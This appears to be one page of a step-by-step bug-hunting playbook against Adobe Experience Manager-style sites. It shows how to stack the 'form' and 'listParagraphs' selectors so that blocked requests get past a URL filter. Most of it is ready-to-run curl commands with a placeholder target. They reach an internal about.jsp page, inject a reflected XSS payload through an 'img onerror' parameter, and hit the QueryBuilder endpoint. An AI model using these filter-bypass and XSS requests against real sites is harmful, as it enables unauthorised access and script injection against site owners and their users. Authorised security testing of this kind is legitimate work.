# Batch 11 — Stack two cheat codes

## FILL IN

```bash
T="https://TARGET"
PAGE="/content/YOUR/PAGE"
```

## GOAL
Put `form` on the outside and `listParagraphs` on the inside so blocked selectors still run.

## TIME
~45–75 min

## YOU NEED
- Tried 06 and 10

---

## WHY (30 seconds)

Sometimes the guard blocks the word `listParagraphs` in the URL.  
`form` can hide the real work in the **suffix**.  
Guard sees: `page.form.js`  
App runs: the listParagraphs URL that follows.

Two simple tools stacked = one stronger tool. That is all.

---

## DO THIS

```bash
T="https://PUT-THE-SITE-HERE"
PAGE="/content/YOUR/PAGE"
```

### 1) form → about.jsp

```bash
curl -sk -o /tmp/ch.html -w "%{http_code} bytes=%{size_download}\n" \
  "$T${PAGE}.form.js${PAGE}.listParagraphs.html?itemResourceType=/libs/granite/ui/components/shell/help/about/about.jsp&limit=1"
head -c 400 /tmp/ch.html; echo
```

### 2) form → XSS path

```bash
curl -sk -o /tmp/ch.html -w "%{http_code}\n" \
  "$T${PAGE}.form.js${PAGE}.listParagraphs.html?itemResourceType=/libs/cq/statistics/components/queries-by-result/html.jsp&limit=1&path=%3Cimg%20src=x%20onerror=alert(1)%3E"
grep -i onerror /tmp/ch.html | head
```

### 3) form → QueryBuilder (confirm)

```bash
curl -sk -o /tmp/ch.json -w "%{http_code} bytes=%{size_download}\n" \
  "$T${PAGE}.form.css/bin/querybuilder.json?path=/content&p.limit=2"
head -c 250 /tmp/ch.json; echo
```

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| Chain works where 10 alone failed | Big finding — write clear PoC |
| Nothing new | Close selector track |

---

## NEXT
- Forms from batch 01 → [12-forms-surface.md](./12-forms-surface.md)  
- No Forms → [15-modern-ssrf-xxe.md](./15-modern-ssrf-xxe.md)
